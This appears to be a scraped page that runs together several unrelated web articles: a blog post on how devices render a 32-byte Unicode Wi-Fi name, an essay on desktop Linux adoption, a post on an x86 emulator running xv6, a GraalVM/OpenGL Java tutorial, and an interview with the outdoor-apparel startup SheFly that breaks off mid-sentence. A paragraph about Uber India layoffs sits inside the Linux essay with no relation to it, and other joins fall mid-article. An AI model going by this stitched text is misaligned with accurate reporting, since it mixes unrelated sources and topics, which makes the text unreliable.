<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>   <p>This is a continuation of my previous post <a href="https://hamptonmoore.com/posts/weird-wifi-name-display/">Comparing how different devices display the SSID “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa”</a>. After posting it on HackerNews I got lots of feedback. The key one was something that I had sadly missed when I originally started this project. When the WiFi name of “á̶̛̛̓̿̈͐͆̐̇̒̑̈́͘͝aaa” got shortened down to a one byte before the second “a” due to the 32 byte/octet limit of SSIDs. The issue was this character is actually two bytes wide, so the first part of the character stayed, with the second byte of it missing. The character in question was ◌̈́, with the hex codepoint cd84. Looking at the raw hex of the SSID you can see it ends in cd, <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc91cd</code>. For those curious about how that would be rendered on your device here it is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�”. After realizing this I decided my previous comparisons of how devices reacted to my weird unicode SSID was unfair. The SSID this time is “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” which is almost the exact same but that last two byte long character was replaced with an “a”. This was to keep the SSID at 32 octets long. Looking at the new hex of the SSID <code>61ccb6cc81cc93ccbfcc88cc9bcc9bcd90cd98cd86cc90cd9dcc87cc92cc9161</code> you can see that is is identical baring the <code>61</code> instead of a <code>cd</code> at the end.</p> <p>Below are the previous photos of the previous SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝�” with the new SSID “á̶̛̛̓̿̈͐͆̐̇̒̑͘͝a” under it. They are also grouped the same as previously to keep continuity.</p> <p>Galaxy S8 running Android 9 with Kernel 4.4.153 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/android.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/android.jpg" alt=""></p> <p>Amazon Firestick <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/firestick.jpg" alt=""></p> <p><img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/firestick.jpg" alt=""></p> <p>As before the Galaxy S8 and the Firestick both handled it perfectly with there being no issues with how it rendered besides vertical cutoff which makes sense.</p> <p>iPhone running iOS 13.5.1 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/iphone-ios1351.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/iphone-ios1351.jpg" alt=""></p> <p>Apple TV Second Generation <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/appletvgen2.jpg" alt=""> <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/appletvgen2.jpg" alt=""></p> <p>These results were interesting. It showed that if the UTF-8 character in an SSID is invalid then IOS falls back to the <a href="https://en.wikipedia.org/wiki/Mac_OS_Roman">Mac OS Roman</a> character set, but since the new SSID is valid UTF-8 iOS properly renderers the SSID.</p> <p>2012 Macbook running High Sierra 10.13.6 <img src="https://cdn.hampton.pw/hampton.pw/resources/iosWifiBug/d2/macos.jpg" alt=""></p> <p>Unlike last time the Macbook actually showed the network.

Sadly the Vizio was not able to show the SSID and just fell back to escaped hex.</p> <p>The results from changing the SSID showed a couple things, namely devices really do not like it when they are given invalid or incomplete UTF-8 codes and lots of devices handle UTF-8 text much better than I thought they would. It also showed that some devices fallback to their native 8 bit encoding formats when they see an invalid UTF-8 codepoint, there is probably some room for exploitation here like inserting escape keys. I originally was not expecting the kindle to work at all, nor the chromebook after seeing the slew of question marks originally. Android was also found to be at handling text with invalid UTF-8 characters it just removed them as opposed to switching up formatting, falling back to hex, or erroring out with all question marks.</p> <p>Thank you to everyone who provided valuable feedback on the previous post. I have more research I plan ond doing with this in the future.</p> <p>Lastly if anyone would like to run this test themselves and send me the comparison results to be added my email is <code>me (at) hampton (This key &gt; not shifted) pw</code>.</p> <hr> <p> Hello reader.

<![CDATA[Another non-year of Linux on the desktop]]>

July 4, 2020 | https://www.sicpers.info/2020/07/another-non-year-of-desktop-linux/ | <a href="https://web.archive.org/web/*/https://www.sicpers.info/2020/07/another-non-year-of-desktop-linux/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<p>Let’s look at other software on the desktop, to understand why there isn’t (as a broad, popular platform) Linux on the desktop, then how there could be.</p>





<p>Over on De Programmatica Ipsum I discussed <a href="https://deprogrammaticaipsum.com/cross-platform-is-the-platform/">the difference between the platform business model, and the technology platform</a>. In the platform model, the business acts as a matchmaking agent, connecting customers to vendors. An agricultural market is a platform, where stud farmers can meet dairy farmers to sell cattle, for example.</p>





<p>Meanwhile, when a technology platform is created by a business, it enables a two-sided business model. The (technology) platform vendor sells their APIs to developers as a way of making applications. They sell their technology to consumers with the fringe benefit that these third-party applications are available to augment the experience. The part of the business that is truly a platform model is the App Store, but those came late as an effort to capture a share of the (existing) developer-consumer sales revenue, and don’t really make the vendors platform businesses.</p>





<p>In fact, I’m going to drop the word platform now, as it has these two different meanings. I’ll say “store” or “App Store” when I’m talking about a platform business in software, and “stack” or “software stack” when I’m talking about a platform technology model.</p>





<p>Stack vendors have previously been very protective of their stack, trying to fend off alternative technologies that allow consumers to take their business elsewhere. Microsoft famously “poisoned” Java, an early and capable cross-platform application API, by bundling their own runtime that made Java applications deliberately run poorly. Apple famously added a clause to their store rules that forbade any applications made using off-stack technology.</p>





<p>Both of these situations are now in the past: Microsoft have even embraced some cross-platform technology options, making heavy use of Electron in their own applications and even integrating the Chromium rendering engine into their own browser to increase compatibility with cross-platform technology and reduce the cost of supporting those websites and applications made with Javascript. Apple have abandoned that “only” clause in their rules, replacing it with a collection of “but also” rules: yes you can make your applications out of whatever you want, but they have to support sign-in and payment mechanisms unique to their stack. So a cross-stack app is <em>de jure</em> better integrated in Apple’s sandpit.</p>





<p>These actions show us how these stack vendors expect people to switch stacks: they find a compelling application, they use it, they discover that this application works better or is better integrated on another stack, and so they change to it. If you’re worried about that, then you block those applications so that your customers can’t discover them. If you’re not worried about that, then you allow the technologies, and rely on the fact that applications are commodities and nobody is going to find a “killer app” that makes them switch.</p>





<p>Allowing third-party software on your own platform (cross-stack or otherwise) comes with a risk, that people are only buying your technology as an incidental choice to run something else, and that if it disappears from your stack, those customers might go away to somewhere that it is available. Microsoft have pulled that threat out of their briefcase before, settling a legal suit with Apple after suggesting that they would remove Word and Excel from the Mac stack.</p>





<p>That model of switching explains why companies that are otherwise competitors seem willing to support one another by releasing their own applications on each others’ stacks. When Apple and Microsoft are in competition, we’ve already seen that Microsoft’s applications give them leverage over Apple: they also allow Apple customers to be fringe players in the Microsoft sandpit, which may lead them to switch (for example when they see how much easier it is for their Windows-using colleagues to use all of the Microsoft collaboration tools their employers use). But Apple’s applications also give them leverage over Microsoft: the famed “halo effect” of Mac sales being driven by the iPod fits this model: you buy an iPod because it’s cool, and you use iTunes for Windows. Then you see how much better iTunes for Mac works, and your next computer is a Mac. The application is a gateway to the stack.</p>





<p>What has all of this got to do with desktop Linux? Absolutely nothing, and that’s my point. There’s never been a “halo effect” for the Free Software world because there’s never been a nucleus around which that halo can form. The <a href="http://catb.org/~esr/writings/cathedral-bazaar/cathedral-bazaar/">bazaar model</a> does a lot to ensure that. Let’s take a specific example: for many people, Thunderbird is the best email client you can possibly get. It also exists on multiple stacks, so it has the potential to be a “gateway” to desktop Linux.</p>





<p>But it won’t be. The particular bazaar hawkers working on Thunderbird don’t have any particular commitment to the rest of the desktop Linux stack: they’re not necessarily against it, but they’re not necessarily for it either. If there’s an opportunity to make Thunderbird better on Windows, anybody can contribute to exploit that opportunity. At best, Thunderbird on desktop Linux will be as good as Thunderbird anywhere else. Similarly, the people in the Nautilus file manager area of the bazaar have no particular commitment to tighter integration with Thunderbird, because their users might be using GNUMail or Evolution.</p>





<p>At one extreme, the licences of software in the bazaar dissuade switching, too. Let’s say that CUPS, the common UNIX printing subsystem, is the best way to do printing on any platform. Does that mean that, say, Mac users with paper-centric workflows or lifestyles will be motivated to switch to desktop Linux, to get access to CUPS? No, it means Apple will take advantage of the CUPS licence to integrate it into their stack, giving them access to the technology.</p>





<p>The only thing the three big stack vendors seem to agree on when it comes to free software licensing is that the GPL version 3 family of licences is incompatible with their risk appetites, particularly their weaponised patent portfolios. So that points to a way to avoid the second of these problems blocking a desktop Linux “halo effect”. Were there a GPL3 killer app, the stack vendors probably wouldn’t pick it up and integrate it. Of course, with no software patent protection, they’d be able to reimplement it without problem.</p>





<p>But even with that dissuasion, we still find that the app likely wouldn’t be a better experience on a desktop Linux stack than on Mac, or on Windows. There would be no halo, and there would be no switchers. Well, not no switchers, but probably no more switchers.</p>





<p>Am I minimising the efforts of consistency and integration made by the big free software desktop projects, KDE and GNOME? I don’t think so. I’ve used both over the years, and I’ve used other desktop environments for UNIX-like systems (please may we all remember CDE so that we never repeat it). They are good, they are tightly integrated, and thanks to the collaboration on specifications in the Free Desktop Project they’re also largely interoperable. What they aren’t is breakout. Where Thunderbird is a nucleus without a halo, Evolution is a halo without a nucleus: it works well with the other GNOME tools, but it isn’t a lighthouse attracting users from, say, Windows, to ditch the rest of their stack for GNOME on Linux.</p>





<p>Desktop Linux is a really good desktop stack. So is, say, the Mac. You could get on well with either, but unless you’ve got a particular interest in free software, or a particular frustration with Apple, there’s no reason to switch. Many people do not have that interest or frustration.</p>

Earlier, as a part of its massive global layoff of 6,700 employees, Uber India had laid off 600 employees in India. “The impact of Covid-19 and the unpredictable nature of the recovery has left Uber IndiaSA with no choice but to reduce the size of its workforce. Around 600 full time positions across driver and rider support, as well as other functions, are being impacted. These reductions are part of previously announced global job cuts this month,” Pradeep Parameswaran, President, Uber India and South Asia had said during the layoffs in May 2020.

Manik Gupta who was then the Chief Product Officer of Uber had said that Uber is proud of the engineering and product talent based out of Bengaluru and Hyderabad. “We have a goal to double the headcount in these offices and have 1,000 people to build innovative products out of India,” he had said.

      <p>I wrote an x86 simulator that runs a small OS, xv6 for study purpose without translating binaries or memory. Everything is implemented C codes.</p>
<p>Repository Link: <a href="https://github.com/ykskb/dax86">https://github.com/ykskb/dax86</a></p>
<p>Here’s some key points about it (excerpt from README):</p>
<blockquote>
<p>Why:</p>
<ul>
<li>I wanted to learn how an OS runs on CPUs at architecture / instruction level.</li>
</ul>
<p>What:</p>
<ul>
<li>Runs vanilla xv6 (memfs) image from boot.</li>
<li>Each instruction is manually implemented and executed sequentially without binary translation, pipeline or OoOE.</li>
<li>Representation of logic is prioritized over the performance. Codes have bunch of comments covering the instructions and the hardware mechanism as well.</li>
</ul>
</blockquote>
<p>In this article, I’d like to share some of the processes I went through to learn about the CPU architecture and develop this emulator as well as the difficulties I was faced with.</p>
<blockquote>
<p>I’m writing about some of my key learnings in separate articles:</p>
<ul>
<li><a href="https://yohei.codes/post/xv6-bootblock/">xv6 image: Boot Sector</a></li>
<li><a href="https://yohei.codes/post/xv6-memory-1/">xv6: Memory Addressing Part 1</a></li>
<li>xv6: Memory Addressing Part 2 (coming soon)</li>
<li>xv6: Device Emulation (coming soon)</li>
</ul>
</blockquote>
<h3 id="start">Start</h3>
<p>Firstly I started this project with <a href="https://book.mynavi.jp/ec/products/detail/id=41347">this Japanese book</a>. Whether you find the anime girl on cover cute or distracting, it’s a great book to get anyone started with CPU emulator development. It covers some of the core x86 instructions like <code>mov</code>, <code>add</code>, <code>push</code> and <code>call</code> as well as the basics of ModRM. Some of the structure for instruction definition and execution in dax86 comes from this book.</p>
<p>So I got a CPU emulator somewhat shaped and it could run some testing binaries. However it was nowhere near to run an OS at this point. The emulator didn’t have any device, segment registers or control registers and it only supported 32-bit binary which is only applicable after switching to the protected mode in the real world of x86. There were so many instructions to be implemented as well.</p>
<h3 id="booting">Booting</h3>
<p>Having set up the goal of running xv6, I started to implement all the single-byte instructions while doing research on x86 architecture and xv6 internals concurrently. On the x86 architecture, I found about things like A20 line, segmentation, global descriptor table and paging. On the xv6 side, reading the boot block indicated I would need those different modes of memory addressing working as well as some devices like keyboard and disk.</p>
<p>At this point, as I was mostly working on the booting part, I could still write small chunk of assembly or c codes to exercise somewhat TDD approach. I set the expected behaviors with the test cases and tried to pass them. (You can see them in <code>tests</code> directory.) One thing about this is that those expected behaviors were entirely from my understanding of each component. I kept feeling uncertain there and often ended up being wrong. For example, I had misunderstood the base address calculation on GDT (which bits go where), so my tests were passing, however later on it came back as a hard bug when I was working on TSS (task state segment).</p>
<p>In the booting part, I found these 2 parts as the key learnings: kernel code loading from disk to memory and the page directory switching in page size extension. (Specifically the identical mapping to the first virtual mapping.) I’ve covered these in details in separate articles, but I must say figuring out the linker configuration and image creation on xv6 wasn’t that easy for me.</p>
<h3 id="os-initialization">OS Initialization</h3>
<p>Once I made booting work, I reached the main function of xv6. This is where xv6 configures more devices and chips as well as the memory page initialization, eventually starting the OS’ scheduler loop in the user mode. First challenge for me here was MP (multi-processor) configuration. It involves MP configuration table, IOAPIC and LAPIC for multi-processor systems, where hardware interrupts need to be routed as configured among multiple processors. There are documentations available online, but it’s often challenging when you actually try to emulate them because in many cases those docs only touch the concept and never give you the whole data flow in details. Generally I ended up landing on the CS course materials in university websites. It was obvious this kind of challenges were not developers’ daily problems and I almost never found the solution on Stackoverflow. After learning about them, I ended up using threads with locks for device emulation to send and receive IO data asynchronously and separately from the main thread.</p>
<p>The second half of the main function got me stuck for some time. It was the TSS (task state segment) as mentioned above and also ISR (interrupt service routine), both of which are about switching the context of instruction execution. At this point, having a number of init processes run before hitting the issue, I couldn’t create the test case really to exercise TDD approach. Instead I did quite dirty debugging by targeting specific instruction pointer (EIP) and printing out some key info on the emulator. Literally I printed out some memory region of certain range and debugged the issues. It sometimes felt like locating some broken bridge out of world map. Only thing I could do was scoping the search area gradually with some instinct and creativity as a clueless investigator.</p>
<h3 id="first-shell-command">First Shell Command</h3>
<p>Last one of the challenges was actually a bit funny. It was keyboard mapping after I confirmed the shell running in the user mode. Of course xv6 is a real OS to run on hardware, so it handles the scan code instead of ASCII characters. Not wanting to fiddle with the TTY setting of a running environment too much, I made a map from ASCII back to scan code. Once I finished it, I confirmed I could run <code>ls</code>. It was quite slow but I think I can say it was the best <code>ls</code> command I’ve ever run.</p>
<p><img src="https://yohei.codes/image/dax86-xv6.png" alt="dax86-xv6"></p>
<h3 id="p-s">P. S.</h3>
<p>At the point of writing this article, commands like <code>ls</code>, <code>mkdir</code> and <code>echo</code> run fine. However it doesn’t seem to be so stable yet. There seem to be some spots possibly wrong with the user modes’ page mapping or context switching, resulting in “remap” error from the OS. Segmentation error was occasionally observed at certain EIP address in the user mode as well. These indicate there is still a bit more for me to investigate on the implementation and there are multiple parts in xv6 that I haven’t fully understood yet. Hopefully I can achieve them and share more key findings in this blog. Thanks for reading :)</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    
    <p>Let me show how you can use <a href="https://www.graalvm.org/">GraalVM</a> to create an OpenGL app in Java. This is made possible by the <em>native-image</em> tool that helps GraalVM produce truly native binaries capable of interacting with native libraries directly, without any JNI overhead. ⚡️</p><!--more--><h2 id="introduction">Introduction</h2><p>GraalVM has been trending a lot in the Java ecosystem recently. It has a remarkable capability of compiling Java bytecode to native binaries ahead-of-time, an issue that many projects had tried to solve in the past. But that isn't the only fascinating thing. GraalVM supports a multitude of languages like Python, Ruby, JavaScript, C++, Rust, etc. besides the regular JVM languages (like Clojure, Kotlin, and Scala), and lets them interoperate with almost zero overhead. It can also run in multiple contexts including OpenJDK, Node.js, and SubstrateVM (internally used by native-image), making it a powerful polyglot runtime.</p><p>We'll be reproducing the <a href="https://rosettacode.org/wiki/OpenGL/Utah_Teapot">Utah teapot example</a> from Rosetta code in Java 11. Since we'd also be briefly leaving the JVM world to connect with native technologies, some parts would look familiar to C/C++ code. I'm not an OpenGL expert but I'll try my best to explain all the setup. All the source code can be found <a href="https://github.com/praj-foss/opengl-graal-examples">on GitHub</a>.</p><h2 id="project-structure">Project structure</h2><p>Atleast JDK 11 is required to run this project. The <a href="https://plugins.gradle.org/plugin/com.palantir.graal">gradle-graal</a> plugin is used to auto-download GraalVM. It is then configured accordingly:</p><pre><code>graal {
    graalVersion("20.0.0")
    javaVersion("11")

    mainClass("in.praj.glexamples.Main")
    outputName("glExample")
    option("--no-fallback")
    option("--verbose")
    option("--no-server")
    option("-H:+ReportExceptionStackTraces")
}
</code></pre><p>We explicitly mention <code>--no-fallback</code> to prevent GraalVM from using a regular JVM when AOT compilation fails. We also need to specify dependencies on GraalVM and SubstrateVM APIs:</p><pre><code>dependencies {
    val graalVer = graal.graalVersion.get()

    compileOnly("org.graalvm.sdk", "graal-sdk", graalVer)
    compileOnly("org.graalvm.nativeimage", "svm", graalVer)
}
</code></pre><p>Like regular Gradle projects, the sources are present inside <em>src/main/java/</em>. The <code>GLUT</code> and <code>GL</code> classes provide access to functions from <em>libglut</em> and <em>libGL</em>, respectively. The <code>Main</code> class represents our actual OpenGL program. Now let's take a deep dive.</p><h2 id="app-context">App Context</h2><p>First, we specify the required native libraries in a <code>Directives</code> inner class and use it to setup a context for our application. This notifies SubstrateVM of our requirements:</p><pre><code>@CContext(Main.Directives.class)
public class Main {
    public static final class Directives implements CContext.Directives {
        @Override
        public List&lt;String&gt; getHeaderFiles() {
            return Collections.singletonList("&lt;GL/glut.h&gt;");
        }

        @Override
        public List&lt;String&gt; getLibraries() {
            return Arrays.asList("GL", "glut");
        }
    }

    // ...
}
</code></pre><p>Essentially, <code>getHeaderFiles</code> returns the list of all headers we'd have mentioned after <code>#include</code> if it were written in C/C++, and <code>getLibraries</code> returns the list of libraries that would have been passed to your C/C++ compiler.</p><h2 id="bindings">Bindings</h2><p>There's a rich set of API to provide support for raw C/C++ data structures. Most important interface to note is <code>org.graalvm.word.WordBase</code>. It's the base type used to represent native data types like pointers and structs, and its descendants are <strong>not</strong> regular Java objects (descendants of <code>java.lang.Object</code>). Let's take a quick look at parts of <code>&lt;GL/glut.h&gt;</code>, in an over-simplified manner:</p><pre><code>#define  GLUT_SINGLE  0x0000
void  glutInit( int* pargc, char** argv );
void  glutInitDisplayMode( unsigned int displayMode );
void  glutDisplayFunc( void (* callback)( void ) );
</code></pre><p>And here's what the corresponding Java bindings look like:</p><pre><code>@CContext(Main.Directives.class)
class GLUT {
    @CConstant("GLUT_SINGLE")
    static native int SINGLE();

    @CFunction("glutInit")
    static native void init(CIntPointer argc, CCharPointerPointer argv);

    @CFunction("glutInitDisplayMode")
    static native void initDisplayMode(int displayMode);

    @CFunction("glutDisplayFunc")
    static native void displayFunc(Callback callback);

    interface Callback extends CFunctionPointer {
        @InvokeCFunctionPointer void invoke();
    }

    // ...
}
</code></pre><p>There's a boilerplate indeed, but it's much cleaner than JNI. By default, the annotations take the function name as an argument and find the corresponding declaration from the headers. So you have to pass in the names explicitly if you want to use something different for your bindings. Primitive Java types can be used to represent similar C/C++ types, but you'll need to use GraalVM's custom types for handling pointers.The <code>Callback</code> interface is used to represent the signature of a function that needs to be passed into <code>GLUT.displayFunc</code> using a function pointer. After a while, you'll see how we create and pass those function pointers.</p><h2 id="real-program">Real Program</h2><p>Inside our main method we have the actual app code. First, we need to pass in the CLI arguments to our <code>GLUT.init</code> call, and then configure the window system:</p><pre><code>try (var argv = CTypeConversion.toCStrings(args)) {
    var argc = StackValue.get(CIntPointer.class);
    argc.write(args.length);
    GLUT.init(argc, argv.get());
}

GLUT.initDisplayMode(GLUT.SINGLE() | GLUT.RGB() | GLUT.DEPTH());
GLUT.initWindowPosition(15, 15);
GLUT.initWindowSize(400, 400);
try (var title = CTypeConversion.toCString("Utah Teapot - GraalVM")) {
    GLUT.createWindow(title.get());
}
</code></pre><p>The first parameter to <code>GLUT.init</code> is a pointer to the number of CLI arguments, and we create this on our stack using <code>StackValue</code> class. The second parameter is the actual list of CLI arguments, which is represented by an array of Strings in Java and by an array of <code>char*</code> in C/C++. Fortunately, there's a utility class called <code>CTypeConversion</code> for such scenarios. <code>CTypeConversion.toCStrings</code> returns a safe holder for the <code>char**</code> value representing the array, which can be used inside a try-with-resources block. Once the holder is closed, the pointer inside must not be used. We similarly set up <code>GLUT.createWindow</code>.</p><p>Next, we set up the lighting and materials that affect our scene:</p><pre><code>GL.clearColor(0.5f, 0.5f, 0.5f, 0f);
GL.shadeModel(GL.SMOOTH());
try (var white = PinnedObject.create(new float[] {1f, 1f, 1f, 0f});
     var shine = PinnedObject.create(new float[] {70f})) {
    GL.lightfv(GL.LIGHT0(), GL.AMBIENT(), white.addressOfArrayElement(0));
    GL.lightfv(GL.LIGHT0(), GL.DIFFUSE(), white.addressOfArrayElement(0));
    GL.materialfv(GL.FRONT(), GL.SHININESS(), shine.addressOfArrayElement(0));
}

GL.enable(GL.LIGHTING());
GL.enable(GL.LIGHT0());
GL.enable(GL.DEPTH_TEST());
</code></pre><p>The third parameter to <code>GL.lightfv</code> and <code>GL.materialfv</code> requires a float array. Now, Java arrays cannot be directly passed here because they don't descend from <code>WordBase</code>. So we create a <code>PinnedObject</code> to represent this array and pass the pointer to its first element using <code>addressOfArrayElement(0)</code>. Pinning the array is important as it preserves the value of that pointer by preventing the garbage collector from moving it. After the pinned object is closed, the garbage collector is free to remove it.</p><p>We end our main method by setting up display and idle callbacks, and running the GLUT main loop:</p><pre><code>GLUT.displayFunc(displayCallback.getFunctionPointer());
GLUT.idleFunc(idleCallback.getFunctionPointer());
GLUT.mainLoop();
</code></pre><p>The <code>display</code> function is used to draw the teapot, while the <code>idle</code> function updates its angle of rotation. Both are called each frame by the GLUT main loop. Right now, creating pointer to a function with specific signature is a bit tricky. This will likely become much simpler when <a href="https://github.com/oracle/graal/issues/730">issue 730</a> is resolved. Let's take a look at how the display callback is implemented here:</p><pre><code>@CEntryPoint
@CEntryPointOptions(prologue = CEntryPointSetup.EnterCreateIsolatePrologue.class,
                    epilogue = CEntryPointSetup.LeaveTearDownIsolateEpilogue.class)
private static void display() {
    GL.clear(GL.COLOR_BUFFER_BIT() | GL.DEPTH_BUFFER_BIT());

    GL.pushMatrix();
    GL.rotatef(rotation.get().read(), 0f, 1f, 1f);
    try (var mat = PinnedObject.create(new float[] {1, 0, 0, 0})) {
        GL.materialfv(GL.FRONT(), GL.DIFFUSE(), mat.addressOfArrayElement(0));
    }
    GLUT.wireTeapot(0.5);
    GL.popMatrix();

    GL.flush();
}

private static final CEntryPointLiteral&lt;GLUT.Callback&gt; displayCallback =
        CEntryPointLiteral.create(Main.class, "display");
</code></pre><p>The <code>display</code> function is annotated as a <code>@CEntryPoint</code> to allow calling it from the native side. The <code>@CEntryPointOptions</code> is used to configure the handling of <em>Isolates</em>. These are disjoint heaps that can be used to strictly separate groups of objects in memory. I won't go deeper into the topic, but you can see <a href="https://link.medium.com/0eOUY2HGI7">Christian Wimmer's post</a> for an idea. Each time such an entry-point is called, we need to take care of the isolate it will be executed in. We simply create an isolate upon entering the function and destroy it upon returning. Finally, we create a <code>CEntryPointLiteral</code> to hold the pointer to <code>display</code> and cast it as a <code>GLUT.Callback</code>.</p><p>Now we need to implement the <code>idle</code> function to update the angle of rotation. This angle is stored as an global variable whose pointer is accessible to both <code>display</code> and <code>idle</code> functions.</p><pre><code>private static final CGlobalData&lt;CFloatPointer&gt; rotation = 
    CGlobalDataFactory.createBytes(() -&gt; 4);

@CEntryPoint
@CEntryPointOptions(prologue = CEntryPointSetup.EnterCreateIsolatePrologue.class,
                    epilogue = CEntryPointSetup.LeaveTearDownIsolateEpilogue.class)
private static void idle() {
    var rotPtr = rotation.get();
    rotPtr.write(0.1f + rotPtr.read());
    GLUT.postRedisplay();
}

private static final CEntryPointLiteral&lt;GLUT.Callback&gt; idleCallback =
        CEntryPointLiteral.create(Main.class, "idle");
</code></pre><p>Any <code>static final</code> value is stored in a special location called the <em>Image Heap</em> and this is accessible to any isolate. We allocate 4 bytes (size of <code>float</code>) and create a pointer to this in our image heap using <code>CGlobalDataFactory</code>. This global variable can be accessed inside <code>idle</code> function to update the …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
  <p><strong>Could you give us a quick introduction to SheFly?&nbsp;</strong></p><p>SheFly is a women’s outdoor apparel company. We specialise in women’s pants, with a patent-pending zipper, so that everyone can relieve themselves outside without removing their clothing. The goal is to make women feel comfortable and confident outside and also, help with safety issues if you have to remove harnesses and other safety equipment when you go to the bathroom outside.</p><p>We are still relatively new – we’re about two and a half years old. We launched via a crowdfunding campaign last spring on IFundWomen, where we raised $55,000, which was triple our goal. That allowed us to get into manufacturing. We’ve also got some investment from the Dorm Room Fund and First Round Capital. &nbsp;</p><p><strong>What was your career journey prior to starting SheFly?&nbsp;</strong></p><p>I started SheFly with two co-founders while I was still in college. Before that, I had worked on a number of social impact projects and organisations. I was always very entrepreneurial. I started my own art business where I sold paintings and prints. I did that as my summer job in college. I actually did a research fellowship concurrent with SheFly. My fellowship was called The Watson Fellowship, and I was supposed to spend 12 months (it ended up being less because of COVID) researching women’s working conditions in rural mountain communities around the world. Specifically focussing on women who work as mountaineering, rock climbing and trekking guides. I did research in India, Nepal, Thailand, Chile and Argentina, before I had to return because of COVID.&nbsp;</p><p><strong>&nbsp;How did you come across the idea?</strong></p><p>My co-founder Georgia Grace came up with the idea because she was working as a glacier guide in Alaska. Most of the other guides were men and they could just turn around and go to the bathroom. Whereas she would have to trek away across glaciers and pull all of her clothing off in order to relieve herself. She thought that there must be a better way to do that. Her and my other co-founder Bianca worked together for a summer in Salt Lake City. They went on a lot of hikes and discussed it further over many uncomfortable pee-breaks where they had to completely disrobe. They decided there could actually be some market potential.</p><p>&nbsp;They came back to school, and time went on, and then Georgia Grace decided to take a class on entrepreneurship at our university. I’d heard she was doing it, and thought that the idea was great. I’m a rock climber and a mountaineer and I’ve spent a lot of time on rope teams, with, usually all men. You’re up on a glacier and the guys all just unzip their flies and go to the bathroom and I would not be able to use the bathroom for the entire time we were on the glacier, unless I wanted to take my harness off. That’s a really big safety risk because you can fall at any moment, and that’s why you have to rope up in the first place. I actually ended up joining the team because I was studying in Mauritius, and I had to have emergency surgery, and got stuck there on the island, which led to me needing to take a semester off from school. So then Bianca said “we’re starting this for real now, and we need help” and I had time, so that’s how I joined.&nbsp;</p><p><strong>How did you meet your cofounders?</strong></p><p>We all went to college together. We went to a pretty small liberal arts school in Vermont, called Middlebury. Everyone kind of knows each other generally, but I met Bianca because we lived in the same house and she became good friends with Georgia Grace because of their summer working together. I didn’t know Georgia Grace all that well before we started working together.&nbsp;</p><p><strong>Were there any other ideas that you were considering when you were starting out?</strong></p><p>The goal was to solve the problem. We definitely started the company because we wanted a product that makes it easier for women to go to the bathroom outside. We worked on a lot of different designs for how that product would function. We first looked to what exists in the market already, which are funnels called female urination devices, that you can line up under your pants. But they have leakage issues and we also didn’t like the idea of having to adapt women’s anatomy to fit men’s clothing. Instead, we wanted to address clothing to fit our anatomy and our bodies. There are skirts which are specifically designed for hiking, but you can’t wear harnesses with those and you also can’t use them in the snow.&nbsp;</p><p>The original problem that Georgia Grace wanted to tackle was the issue of being cold, because that was her experience in the glaciers. So we started out with snow pants. The first prototypes are bright blue with a neon yellow zipper sewn into the crotch. Bianca actually graduated from college wearing that prototype, because we have a graduation ceremony where you ski down a hill in order to graduate. That’s how we started. We decided that that was not the product to go to market with, partly because it’s a seasonal industry, to make snow pants. And also because most people will only buy one or two, it’s much more expensive, way more difficult to manufacture and it didn’t make sense because when people are skiing in resorts there are usually bathrooms available.&nbsp;</p><p>That’s when we decided to make normal hiking pants. We wanted it to be nice-enough looking that you could wear it on the street, or wear it to work. We didn’t just want to solve the problem of having to go to the bathroom, we wanted to solve other problems involved with women’s pants. One of those problems is pocket size. Our pockets are on average 2/3 the size of men’s pockets, so we wanted to make sure we had pockets big enough to hold things. It’s absurd that women often can’t fit a wallet or a phone into pockets that are clearly intended to carry those items. We also wanted to use a fabric that was tough enough to not rip when you’re sliding over rocks or doing things like that.</p><p><strong>How did your previous experience prepare you for your current venture? In what ways were you unprepared?</strong></p><p>We all went to liberal arts school. We learned how to think, how to learn and how to teach ourselves, which I think is the best skill that you get out of that type of education. I majored in Philosophy, Bianca studied GIS, Georgia Grace studied Economics and Politics. None of us had a background in manufacturing, and that was definitely our biggest gap coming into it. After working with lawyers and seamstresses around Vermont, we’d come up with the design that we wanted to patent but we didn’t know how to turn that into something that would be available for people to purchase. We were able to overcome that through a lot of research, partly through trial and error, and by hiring a designer based in New York who could help us prototype and figure out how the size gradings should work and all of that. We worked with a factory that was very helpful when it came to prototyping and helping us figure out exactly what we wanted.&nbsp;</p><p><strong>After you had the idea what were the next steps? &nbsp;</strong></p><p>The IP aspect was a big challenge for us. We were very unclear about whether we needed to be making the product or selling it first, so that we have the capital to pay for the patents, or if we needed to patent everything first before we sold any units. We figured that out through trial and error and talking to lawyers. We ended up handling the IP first and perfecting the design. We launched through a crowdfunding campaign. We took pre-orders before we had made the product, and that was very helpful for us, because we didn’t have to put in many thousands of dollars to create a product that we weren’t sure people wanted. We also knew how much of each size we needed, and we could also use that data to predict what sizes we should make for the next run of product.&nbsp;</p><p><strong>Did the idea evolve as things progressed?&nbsp;</strong></p><p>We’ve changed a lot. One of the biggest pieces of feedback we’ve gotten is that people want the product in a lighter colour. Partly because they want another style, partly because when you’re hiking in the summer, the black fabric feels warmer against your skin and partly because of tick prevention – you can’t see ticks very easily if they’re in black.&nbsp;</p><p>We also had originally planned on having a smaller size run, and not having different in-seam lengths. But we got a lot of really insistent and positive feedback about expanding that. When we were first prototyping, we used very bright colours. We would use pink pants with blue zippers, and we realised pretty quickly that although some people loved it, most people preferred simple black pants.&nbsp;</p><p><strong>Did you encounter any unique challenges because you have to go through a whole manufacturing process?</strong></p><p>It was and has continued to be extremely difficult to manage the supply chain. The factory we were using is now shutting down because of COVID. So we 